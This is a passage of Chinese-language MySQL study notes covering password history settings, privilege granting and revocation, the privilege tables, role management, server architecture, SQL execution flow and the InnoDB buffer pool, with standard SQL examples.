<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 方法1 使用SQL语句</span></span><br><span class="line"><span class="keyword">SET</span> PERSIST password_history <span class="operator">=</span> <span class="number">6</span>; <span class="comment">--设置不能选择最近使用过的6个密码</span></span><br><span class="line"><span class="keyword">SET</span> PERSIST password_reuse_interval <span class="operator">=</span> <span class="number">365</span>; <span class="comment">--设置不能选择最近一年内的密码</span></span><br><span class="line"><span class="comment">-- 方法2 配置文件my.cnf中进行维护</span></span><br><span class="line">[mysqld]</span><br><span class="line">password_history<span class="operator">=</span><span class="number">6</span></span><br><span class="line">password_reuse_interval<span class="operator">=</span><span class="number">365</span></span><br></pre></td></tr></table></figure>

<p>单独用户设置:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 不能使用最近5个密码：</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;kangshifu&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> PASSWORD HISTORY <span class="number">5</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;kangshifu&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> PASSWORD HISTORY <span class="number">5</span>;</span><br><span class="line"><span class="comment">-- 不能使用最近365天内的密码：</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;kangshifu&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> PASSWORD REUSE <span class="type">INTERVAL</span> <span class="number">365</span> <span class="keyword">DAY</span>;</span><br><span class="line"><span class="comment">-- 既不能使用最近5个密码，也不能使用365天内的密码</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;kangshifu&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> PASSWORD HISTORY <span class="number">5</span> PASSWORD REUSE <span class="type">INTERVAL</span> <span class="number">365</span> <span class="keyword">DAY</span>;</span><br></pre></td></tr></table></figure>

<h3 id="权限管理"><a href="#权限管理" class="headerlink" title="[!] 权限管理"></a>[!] 权限管理</h3><h4 id="权限列表和授权原则"><a href="#权限列表和授权原则" class="headerlink" title="权限列表和授权原则"></a>权限列表和授权原则</h4><p>查看权限列表：<code>show privileges;</code><br>常用权限组合：</p>
<ol>
<li><code>CREATE和DROP权限</code>，可以创建新的数据库和表，或删除（移掉）已有的数据库和表。如果将MySQL数据库中的DROP权限授予某用户，用户就可以删除MySQL访问权限保存的数据库。</li>
<li><code>SELECT、INSERT、UPDATE和DELETE权限</code>允许在一个数据库现有的表上实施操作。</li>
<li><code>SELECT权限</code>只有在它们真正从一个表中检索行时才被用到。</li>
<li><code>INDEX权限</code>允许创建或删除索引，INDEX适用于已有的表。如果具有某个表的CREATE权限，就可以在CREATE TABLE语句中包括索引定义。</li>
<li><code>ALTER权限</code>可以使用ALTER TABLE来更改表的结构和重新命名表。</li>
<li><code>CREATE ROUTINE权限</code>用来创建保存的程序（函数和程序），<code>ALTER ROUTINE权限</code>用来更改和删除保存的程序，<code>EXECUTE权限</code>用来执行保存的程序。</li>
<li><code>GRANT权限</code>允许授权给其他用户，可用于数据库、表和保存的程序。</li>
<li><code>FILE权限</code>使用户可以使用LOAD DATA INFILE和SELECT … INTO OUTFILE语句读或写服务器上的文件，任何被授予FILE权限的用户都能读或写MySQL服务器上的任何文件（说明用户可以读任何数据库目录下的文件，因为服务器可以访问这些文件）</li>
</ol>
<p><strong>授权与安全原则</strong></p>
<ol>
<li>只授予能<code>满足需要的最小权限</code>，防止用户干坏事。比如用户只是需要查询，那就只给select权限就可以了，不要给用户赋予update、insert或者delete权限。</li>
<li>创建用户的时候<code>限制用户的登录主机</code>，一般是限制成指定IP或者内网IP段。</li>
<li>为每个用户<code>设置满足密码复杂度的密码</code>。</li>
<li>定期清理不需要的用户，回收权限或者删除用户</li>
</ol>
<h4 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h4><p>给用户授权的方式有 2 种，分别是通过把<code>角色赋予用户给用户授权</code>和<code>直接给用户授权</code>。用户是数据库的使用者，我们可以通过给用户授予访问数据库中资源的权限，来控制使用者对数据库的访问，消除安全隐患。</p>
<p>直接授权</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> 权限<span class="number">1</span>,权限<span class="number">2</span>,…权限n <span class="keyword">ON</span> databaseName.tableName <span class="keyword">TO</span> username<span class="variable">@hostname</span> [IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;passwd&#x27;</span>] [<span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION];</span><br><span class="line"><span class="comment">-- 示例：插删改查</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>,<span class="keyword">INSERT</span>,<span class="keyword">DELETE</span>,<span class="keyword">UPDATE</span> <span class="keyword">ON</span> atguigudb.<span class="operator">*</span> <span class="keyword">TO</span> li4<span class="variable">@localhost</span>;</span><br><span class="line"><span class="comment">-- 示例：所有权限（不包括GRANT）</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> joe@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="comment">-- 示例：查看权限和授权权限</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看当前用户权限</span></span><br><span class="line"><span class="keyword">SHOW</span> GRANTS;</span><br><span class="line"><span class="comment">-- 或</span></span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="built_in">CURRENT_USER</span>;</span><br><span class="line"><span class="comment">-- 或</span></span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="built_in">CURRENT_USER</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看某用户全局权限</span></span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="string">&#x27;userName&#x27;</span>@<span class="string">&#x27;hostName&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="收回权限"><a href="#收回权限" class="headerlink" title="收回权限"></a>收回权限</h4><p>使用 REVOKE语句 取消用户的某些权限。使用REVOKE收回权限之后，用户账户的记录将从db、host、tables_priv和columns_priv表中删除，但是用户账户记录仍然在user表中保存（删除user表中的账户记录使用DROP USER语句）。</p>
<p><strong>删除用户前必须收回一切权限</strong><br>被夺权用户重新登录后生效，当前登录下权限不变</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 语法</span></span><br><span class="line"><span class="keyword">REVOKE</span> 权限<span class="number">1</span>,权限<span class="number">2</span>,…权限n <span class="keyword">ON</span> databaseName.tableName <span class="keyword">FROM</span> username<span class="variable">@hostname</span>;</span><br><span class="line"><span class="comment">-- 示例：收回一切权限</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">FROM</span> joe@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="了解-权限表"><a href="#了解-权限表" class="headerlink" title="(了解)权限表"></a>(了解)权限表</h3><h4 id="user表"><a href="#user表" class="headerlink" title="user表"></a>user表</h4><p>user表是MySQL中最重要的一个权限表，记录用户账号和权限信息，有49个字段，可以分成4类，分别是范围列（或用户列）、权限列、安全列和资源控制列。</p>
<p><strong>范围列（或用户列）</strong></p>
<ul>
<li><code>host</code>: 表示连接类型，可取如下范围：<ul>
<li><code>%</code> 表示所有远程通过TCP方式的连接</li>
<li><code>IP地址</code> 如(192.168.1.2、127.0.0.1)通过制定ip地址进行的TCP方式的连接</li>
<li><code>机器名</code> 通过制定网络中的机器名进行的TCP方式的连接</li>
<li><code>::1</code> IPv6的本地ip地址，等同于IPv4的 127.0.0.1</li>
<li><code>localhost</code> 本地方式通过命令行方式的连接 ，比如mysql -u xxx -p xxx 方式的连接。</li>
</ul>
</li>
<li><code>user</code>: 表示用户名，同一用户通过不同方式链接的权限是不一样的。</li>
<li><code>password</code>: 密码<blockquote>
<p>所有密码串通过password(明文字符串)生成的密文字符串。MySQL8.0在用户管理方面增加了角色管理，默认的密码加密方式也做了调整，由之前的SHA1改为了SHA2，不可逆。同时加上MySQL5.7的禁用用户和用户过期的功能，MySQL在用户管理方面的功能和安全性都较之前版本大大的增强了。mysql5.7及之后版本的密码保存到authentication_string字段中不再使用password字段。</p>
</blockquote>
</li>
</ul>
<p><strong>权限列</strong></p>
<ul>
<li>Grant_priv字段: 表示是否拥有GRANT权限</li>
<li>Shutdown_priv字段: 表示是否拥有停止MySQL服务的权限</li>
<li>Super_priv字段: 表示是否拥有超级权限</li>
<li>Execute_priv字段: 表示是否拥有EXECUTE权限。拥有EXECUTE权限，可以执行存储过程和函数。</li>
<li>Select_priv, Insert_priv等: 为该用户所拥有的权限。</li>
</ul>
<p><strong>安全列</strong> </p>
<blockquote>
<p>安全列只有6个字段，其中两个是ssl相关的（ssl_type、ssl_cipher），用于加密；两个是x509相关的（x509_issuer、x509_subject），用于标识用户；另外两个Plugin字段用于验证用户身份的插件，该字段不能为空。如果该字段为空，服务器就使用内建授权验证机制验证用户身份。</p>
</blockquote>
<p><strong>资源控制列</strong><br>资源控制列的字段用来限制用户使用的资源，包含4个字段，分别为：</p>
<ul>
<li>max_questions，用户每小时允许执行的查询操作次数；</li>
<li>max_updates，用户每小时允许执行的更新操作次数；</li>
<li>max_connections，用户每小时允许执行的连接操作次数；</li>
<li>max_user_connections，用户允许同时建立的连接次数。</li>
</ul>
<h4 id="db、table-priv、columns-priv、procs-priv表"><a href="#db、table-priv、columns-priv、procs-priv表" class="headerlink" title="db、table_priv、columns_priv、procs_priv表"></a>db、table_priv、columns_priv、procs_priv表</h4><p><strong>db表</strong></p>
<ol>
<li><code>用户列</code>: db表用户列有3个字段，分别是Host、User、Db。这3个字段分别表示主机名、用户名和数据库名。表示从某个主机连接某个用户对某个数据库的操作权限，这3个字段的组合构成了db表的主键。</li>
<li><code>权限列</code>: Create_routine_priv和Alter_routine_priv这两个字段决定用户是否具有创建和修改存储过程的权限。</li>
</ol>
<p><strong>tables_priv表</strong> 设置表的操作权限<br>tables_priv表有8个字段，分别是Host、Db、User、Table_name、Grantor、Timestamp、Table_priv和Column_priv，各个字段说明如下：</p>
<ul>
<li>Host、Db、User和Table_name四个字段分别表示主机名、数据库名、用户名和表名。</li>
<li><code>Grantor</code>表示修改该记录的用户。</li>
<li><code>Timestamp</code>表示修改该记录的时间。</li>
<li><code>Table_priv</code>表示对象的操作权限。包括Select、Insert、Update、Delete、Create、Drop、Grant、References、Index和Alter。</li>
<li><code>Column_priv</code>字段表示对表中的列的操作权限，包括Select、Insert、Update和References。</li>
</ul>
<p><strong>columns_priv表</strong> 设置表的某一列的权限 </p>
<p><strong>procs_priv表</strong> 设置存储过程和存储函数的操作权限</p>
<h3 id="了解-访问控制流程"><a href="#了解-访问控制流程" class="headerlink" title="(了解)访问控制流程"></a>(了解)访问控制流程</h3><p><strong>1 连接核实阶段</strong><br>当用户试图连接MySQL服务器时，服务器基于用户的身份以及用户是否能提供正确的密码验证身份来确定接受或者拒绝连接。即客户端用户会在连接请求中提供用户名、主机地址、用户密码，MySQL服务器接收到用户请求后，会<strong>使用user表中的host、user和authentication_string</strong>这3个字段<strong>匹配</strong>客户端提供信息。服务器只有在user表记录的Host和User字段匹配客户端主机名和用户名，并且提供正确的密码时才接受连接。如果连接核实没有通过，服务器就完全拒绝访问；否则，服务器接受连接，然后进入阶段2等待用户请求。</p>
<p><strong>2 请求核实阶段</strong><br>一旦建立了连接，服务器就进入了访问控制的阶段2，也就是请求核实阶段。对此连接上进来的每个请求，服务器检查该请求要执行什么操作、是否有足够的权限来执行它，这正是需要授权表中的权限列发挥作用的地方。这些权限可以来自user、db、table_priv和column_priv表。确认权限时，MySQL<code>首先检查user表</code> ，如果指定的权限没有在user表中被授予，那么MySQL就会<code>继续检查db表</code>，db表是下一安全层级，其中的权限限定于数据库层级，在该层级的SELECT权限允许用户查看指定数据库的所有表中的数据；如果在该层级没有找到限定的权限，则MySQL继续<code>检查tables_priv表以及columns_priv表</code>，如果所有权限表都检查完毕，但还是没有找到允许的权限操作，MySQL将返回错误信息 ，用户请求的操作不能执行，操作失败。</p>
<blockquote>
<p>提示： MySQL通过向下层级的顺序（从user表到columns_priv表）检查权限表，但并不是所有的权限都要执行该过程。例如，一个用户登录到MySQL服务器之后只执行对MySQL的管理操作，此时只涉及管理权限，因此MySQL只检查user表。另外，如果请求的权限操作不被允许，MySQL也不会继续检查下一层级的表。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240815203947.png" alt="MySQL访问控制机制"></p>
<h3 id="角色管理"><a href="#角色管理" class="headerlink" title="[!] 角色管理"></a>[!] 角色管理</h3><p>为用户授予不同角色，从而实现不同角色用户拥有不同权限，简化管理</p>
<h4 id="角色的创建和管理"><a href="#角色的创建和管理" class="headerlink" title="角色的创建和管理"></a>角色的创建和管理</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建角色: host_name省略时默认为%，role_name不可省略，不可为空。</span></span><br><span class="line"><span class="keyword">CREATE</span> ROLE <span class="string">&#x27;role_name&#x27;</span>[@<span class="string">&#x27;host_name&#x27;</span>] [,<span class="string">&#x27;role_name&#x27;</span>[@<span class="string">&#x27;host_name&#x27;</span>]]...</span><br><span class="line"><span class="comment">-- 为角色授权</span></span><br><span class="line"><span class="keyword">GRANT</span> privileges <span class="keyword">ON</span> table_name <span class="keyword">TO</span> <span class="string">&#x27;role_name&#x27;</span>[@<span class="string">&#x27;host_name&#x27;</span>];</span><br><span class="line"><span class="comment">-- 查看角色权限</span></span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="string">&#x27;role_name&#x27;</span>;</span><br><span class="line"><span class="comment">-- 回收权限</span></span><br><span class="line"><span class="keyword">REVOKE</span> privileges <span class="keyword">ON</span> tablename <span class="keyword">FROM</span> <span class="string">&#x27;rolename&#x27;</span>;</span><br><span class="line"><span class="comment">-- 删除角色：拥有此角色的用户也会失去对应权限</span></span><br><span class="line"><span class="keyword">DROP</span> ROLE role [,role2]...</span><br></pre></td></tr></table></figure>

<h4 id="角色的授予，激活和剥夺"><a href="#角色的授予，激活和剥夺" class="headerlink" title="角色的授予，激活和剥夺"></a>角色的授予，激活和剥夺</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 角色的授予：默认没有激活权限</span></span><br><span class="line"><span class="keyword">GRANT</span> role [,role2,...] <span class="keyword">TO</span> <span class="keyword">user</span> [,user2,...];</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 角色的激活：必须激活才真正拥有权限</span></span><br><span class="line"><span class="comment">-- 方法1 </span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">DEFAULT</span> ROLE <span class="keyword">ALL</span> <span class="keyword">TO</span> <span class="string">&#x27;userName&#x27;</span>@<span class="string">&#x27;hostName&#x27;</span>;</span><br><span class="line"><span class="comment">-- 方法2：将activate_all_roles_on_login设置为ON，此后授予角色默认激活</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> activate_all_roles_on_login<span class="operator">=</span><span class="keyword">ON</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看用户角色</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_ROLE</span>();<span class="comment">-- 方法1</span></span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="string">&#x27;userName&#x27;</span>@<span class="string">&#x27;hostName&#x27;</span>;<span class="comment">-- 方法2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 角色的剥夺：剥夺之后用户登录权限失效，若剥夺时在线，不会立即失去权限</span></span><br><span class="line"><span class="keyword">REVOKE</span> role <span class="keyword">FROM</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>


<h4 id="强制角色"><a href="#强制角色" class="headerlink" title="强制角色"></a>强制角色</h4><p>mandatory_roles可以通过在系统变量的值中命名它们来将角色指定为强制性的。服务器将强制角色视为授予所有用户，因此无需明确授予任何帐户。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">mandatory_roles<span class="operator">=</span><span class="string">&#x27;role1,role2@localhost,r3@%.atguigu.com&#x27;</span>; <span class="comment">-- 服务开启前可修改my.cnf</span></span><br><span class="line"><span class="keyword">SET</span> PERSIST mandatory_roles <span class="operator">=</span> <span class="string">&#x27;role1,role2@localhost,r3@%.example.com&#x27;</span>; <span class="comment">-- 系统重启后仍然有效</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> mandatory_roles <span class="operator">=</span> <span class="string">&#x27;role1,role2@localhost,r3@%.example.com&#x27;</span>; <span class="comment">-- 系统重启后失效</span></span><br></pre></td></tr></table></figure>


<h2 id="逻辑架构"><a href="#逻辑架构" class="headerlink" title="逻辑架构"></a>逻辑架构</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240815212511.png" alt="启动和加载配置项"></p>
<p><strong>三层结构：</strong></p>
<ol>
<li>连接层：客户端和服务器端建立连接，客户端发送 SQL 至服务器端；</li>
<li>SQL 层（服务层）：对 SQL 语句进行查询处理；与数据库文件的存储方式无关；</li>
<li>存储引擎层：与数据库文件打交道，负责数据的存储和读取</li>
</ol>
<h3 id="MySQL逻辑架构"><a href="#MySQL逻辑架构" class="headerlink" title="MySQL逻辑架构"></a>MySQL逻辑架构</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240815214908.png" alt="MySQL服务器端逻辑架构"></p>
<h4 id="连接层"><a href="#连接层" class="headerlink" title="连接层"></a>连接层</h4><p>系统（客户端）访问 MySQL 服务器前，做的第一件事就是建立TCP连接。经过三次握手建立连接成功后，MySQL服务器对TCP传输过来的账号密码做身份认证、权限获取。</p>
<ul>
<li>用户名或密码不对，会收到一个Access denied for user错误，客户端程序结束执行</li>
<li>用户名密码认证通过，会从权限表查出账号拥有的权限与连接关联，之后的权限判断逻辑，都将依赖于此时读到的权限<br>TCP连接收到请求后，必须要分配给一个线程专门与这个客户端的交互。所以还会有个线程池，去走后面的流程。每一个连接从线程池中获取线程，省去了创建和销毁线程的开销。<br><strong>控制连接数量和线程</strong></li>
</ul>
<h4 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h4><ol>
<li>SQLInterface:SQL接口<blockquote>
<p>接收用户的SQL命令，并且返回用户需要查询的结果。比如SELECT…FROM就是调用SQL Interface<br>MySQL支持DML（数据操作语言）、DDL（数据定义语言）、存储过程、视图、触发器、自定义函数等多种SQL语言接口</p>
</blockquote>
</li>
<li>Parser:解析器<blockquote>
<p>在解析器中对SQL语句进行语法分析、语义分析。将SQL语句分解成数据结构，并将这个结构传递到后续步骤，以后SQL语句的传递和处理就是基于这个结构的。如果在分解构成中遇到错误，那么就说明这个SQL语句是不合理的。<br>在SQL命令传递到解析器的时候会被解析器验证和解析，并为其创建语法树，并根据数据字典丰富查询语法树，会验证该客户端是否具有执行该查询的权限。创建好语法树后，MySQL还会对SQl查询进行语法上的优化，进行查询重写。</p>
</blockquote>
</li>
<li>Optimizer:查询优化器<blockquote>
<p>SQL语句在语法解析之后、查询之前会使用查询优化器确定SQL语句的执行路径，生成一个执行计划。<br>这个执行计划表明应该使用哪些索引进行查询（全表检索还是使用索引检索），表之间的连接顺序如何，最后会按照执行计划中的步骤调用存储引擎提供的方法来真正的执行查询，并将查询结果返回给用户。<br>它使用“选取-投影-连接”策略进行查询。例如：<br>这个SELECT查询先根据WHERE语句进行选取，而不是将表全部查询出来以后再进行gender过滤。这个SELECT查询先根据id和name进行属性投影，而不是将属性全部取出以后再进行过滤，将这两个查询条件连接起来生成最终查询结果。</p>
</blockquote>
</li>
<li>Caches&amp;Buffers：查询缓存组件<blockquote>
<p>MySQL内部维持着一些Cache和Buffer，比如QueryCache用来缓存一条SELECT语句的执行结果，如果能够在其中找到对应的查询结果，那么就不必再进行查询解析、优化和执行的整个过程了，直接将结果反馈给客户端。这个缓存机制是由一系列小缓存组成的。比如表缓存，记录缓存，key缓存，权限缓存等。这个查询缓存可以在不同客户端之间共享。从MySQL5.7.20开始，不推荐使用查询缓存，并在MySQL8.0中删除。</p>
</blockquote>
</li>
</ol>
<h4 id="引擎层"><a href="#引擎层" class="headerlink" title="引擎层"></a>引擎层</h4><p>插件式存储引擎层（ Storage Engines），真正的负责了MySQL中数据的存储和提取，对物理服务器级别维护的底层数据执行操作，服务器通过API与存储引擎进行通信。不同的存储引擎具有的功能不同，这样我们可以根据自己的实际需要进行选取。<br>MySQL 8.0.25默认支持的存储引擎<code>show engines</code></p>
<p>存储层<br>所有的数据，数据库、表的定义，表的每一行的内容，索引，都是存在文件系统上，以文件的方式存在的，并完成与存储引擎的交互。当然有些存储引擎比如InnoDB，也支持不使用文件系统直接管理裸设备，但现代文件系统的实现使得这样做没有必要了。在文件系统之下，可以使用本地磁盘，可以使用DAS、NAS、SAN等各种存储系统。</p>
<h3 id="重要-SQL的执行流程"><a href="#重要-SQL的执行流程" class="headerlink" title="(重要) SQL的执行流程"></a>(重要) SQL的执行流程</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240815215830.png" alt="SQL执行流程"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240815224101.png" alt="SQL执行顺序"></p>
<p>总体流程简述：</p>
<ol>
<li>查询缓存：查询是否有相同的SQL语句，有则直接返回结果<blockquote>
<p>相同的查询操作(所有字符包括大小写都必须相同)才会命中查询缓存；包含某些系统函数、用户自定义变量和函数、一些系统表的无法缓存；增删改等会导致缓存失效的时候 &#x3D;&#x3D;》 mysql8去除;5.7也是默认关闭</p>
</blockquote>
</li>
<li>解析器词法、语法、语义解析，生成语法树</li>
<li>优化器优化：确定 SQL 语句的执行路径，比如是根据全表检索 ，还是根据索引检索等</li>
<li>执行器：判断用户是否有权限，执行并缓存</li>
</ol>
<h4 id="MySQL8-0中执行流程的测试"><a href="#MySQL8-0中执行流程的测试" class="headerlink" title="MySQL8.0中执行流程的测试"></a>MySQL8.0中执行流程的测试</h4><ol>
<li>确认profiling 是否开启 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@profiling</span>;</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;profiling&#x27;</span></span><br><span class="line"><span class="keyword">set</span> profiling<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
<li>多次执行相同SQL查询</li>
<li>查看当前会话产生的全部profiles <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> profiles;</span><br></pre></td></tr></table></figure></li>
<li>查看上一条命令对应profile: <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> profile;</span><br></pre></td></tr></table></figure>
 可见SQL语句执行过程：<br> <img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240815230654.png" alt="命令执行过程"></li>
</ol>
<h4 id="MySQL5-7中执行流程的测试"><a href="#MySQL5-7中执行流程的测试" class="headerlink" title="MySQL5.7中执行流程的测试"></a>MySQL5.7中执行流程的测试</h4><ol>
<li>配置文件&#x2F;etc&#x2F;my.cnf中开启查询缓存 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">query_cache_type=1</span><br></pre></td></tr></table></figure></li>
<li>重启mysql服务 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart mysqld</span><br></pre></td></tr></table></figure></li>
<li>开启查询执行计划 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> profiling<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
<li>多次执行相同SQL查询</li>
<li>查看当前会话产生的全部profiles</li>
<li>查看上一条命令对应profile:</li>
</ol>
<p>可见SQL语句执行过程</p>
<h3 id="了解-Oracle中的SQL执行流程"><a href="#了解-Oracle中的SQL执行流程" class="headerlink" title="(了解)Oracle中的SQL执行流程"></a>(了解)Oracle中的SQL执行流程</h3><p>共享池：用于判断SQL语句是否存在缓存和执行计划<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240815231147.png" alt="Oracle中的SQL执行流程"></p>
<ol>
<li>语法检查：检查 SQL 拼写是否正确，如果不正确，Oracle 会报语法错误。</li>
<li>语义检查：检查 SQL 中的访问对象是否存在。比如我们在写 SELECT 语句的时候，列名写错了，系统就会提示错误。语法检查和语义检查的作用是保证 SQL 语句没有错误。</li>
<li>权限检查：看用户是否具备访问该数据的权限。</li>
<li>共享池检查：共享池（Shared Pool）是一块内存池，最主要的作用是缓存 SQL 语句和该语句的执行计划。</li>
<li>优化器：优化器中就是要进行硬解析，也就是决定怎么做，比如创建解析树，生成执行计划。</li>
<li>执行器：当有了解析树和执行计划之后，就知道了SQL该怎么被执行，这样就可以在执行器中执行语句了</li>
</ol>
<p><strong>共享池</strong></p>
<p>在共享池中，Oracle首先对SQL语句进行Hash运算，然后根据Hash值在库缓存（LibraryCache）中查找，如果存在SQL语句的执行计划，就直接拿来执行，直接进入“执行器”的环节，这就是<code>软解析</code>。<br>如果没有找到SQL语句和执行计划，Oracle就需要创建解析树进行解析，生成执行计划，进入“优化器”这个步骤，这就是<code>硬解析</code>。。<br>共享池是Oracle中的术语，包括了<code>库缓存，数据字典缓冲区</code>等。我们上面已经讲到了库缓存区，它主要缓存SQL语句和执行计划。而数据字典缓冲区存储的是Oracle中的对象定义，比如表、视图、索引等对象。当对SQL语句进行解析的时候，如果需要相关的数据，会从数据字典缓冲区中提取。库缓存这一个步骤，决定了SQL语句是否需要进行硬解析。为了提升SQL的执行效率，我们应该尽量<br>避免硬解析，因为在SQL的执行过程中，创建解析树，生成执行计划是很消耗资源的。<br>如何避免硬解析，尽量使用软解析呢？<br>在Oracle中，绑定变量是它的一大特色。绑定变量就是在SQL语句中使用变量，通过不同的变量取值来改变SQL的执行结果。这样做的好处是能提升软解析的可能性，不足之处在于可能会导致生成的执行计划不够优化，因此是否需要绑定变量还需要视情况而定。</p>
<h3 id="数据库缓存池"><a href="#数据库缓存池" class="headerlink" title="数据库缓存池"></a>数据库缓存池</h3><p>InnoDB 存储引擎是以页为单位来管理存储空间的，我们进行的增删改查操作其实本质上都是在访问页面（包括读页面、写页面、创建新页面等操作）。而磁盘I&#x2F;O需要消耗的时间很多，而在内存中进行操作，效率则会高很多，为了能让数据表或者索引中的数据随时被我们所用，DBMS 会申请 占用内存来作为数据缓冲池 ，在真正访问页面之前，需要把在磁盘上的页缓存到内存中的 Buffer Pool 之后才可以访<br>问。这样做的好处是可以让磁盘活动最小化，从而减少与磁盘直接进行 I&#x2F;O 的时间。这种策略对提升 SQL 语句的查询性能来说至关重要。如果索引的数据在缓冲池里，那么访问的成本就会降低很多。</p>
<p>InnoDB 缓冲池包括了数据页、索引页、插入缓冲、锁信息、自适应Hash和数据字典信息等，是InnoDB占用内存的主体。</p>
<p><strong>缓存原则</strong>：<code>位置 * 频次</code><br>首先，位置决定效率，提供缓冲池就是为了在内存中可以直接访问数据。<br>其次，频次决定优先级顺序。因为缓冲池的大小是有限的，比如磁盘有200G，但是内存只有 16G，缓冲池大小只有1G，就无法将所有数据都加载到缓冲池里，这时就涉及到优先级顺序，会优先对使用频次高的热数据进行加载。</p>
<p>注意：查询缓存是提前把 查询结果缓存起来，与缓冲池完全不同。</p>
<p>在数据库进行页面读操作的时候，首先会判断该页面是否在缓冲池中，如果存在就直接读取，如果不存在，就会通过内存或磁盘将页面存放到缓冲池中再进行读取。<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240815234813.png"></p>
<p>数据更新时，如果数据存在缓冲池，优先更新缓冲池中数据，一定时间后更新磁盘。</p>
<p><strong>查看和设置缓冲池大小</strong></p>
<p>InnoDB 存储引擎</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询 </span></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;innodb_buffer_pool_size&#x27;</span></span><br><span class="line"><span class="comment">-- 设置 默认128MB</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> innodb_buffer_pool_size <span class="operator">=</span> <span class="number">268435456</span>;</span><br><span class="line"><span class="comment">-- 或修改配置文件</span></span><br><span class="line">[server]</span><br><span class="line">innodb_buffer_pool_size <span class="operator">=</span> <span class="number">268435456</span></span><br></pre></td></tr></table></figure>

<p><strong>多个Buffer Pool</strong></p>
